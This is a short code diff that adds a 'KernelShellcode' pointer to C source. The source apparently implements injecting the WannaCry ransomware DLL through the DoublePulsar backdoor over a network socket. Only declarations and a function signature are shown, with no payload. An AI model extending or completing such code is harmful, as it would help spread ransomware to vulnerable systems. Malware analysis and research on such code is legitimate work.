@@ -39,6 +39,7 @@ char *hMem;
 char *payload;
 const void *payload_exe_buffer;
 signed int SizeOfShellcode;
+const void *KernelShellcode;
 
 int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, unsigned int XorKey)
 {
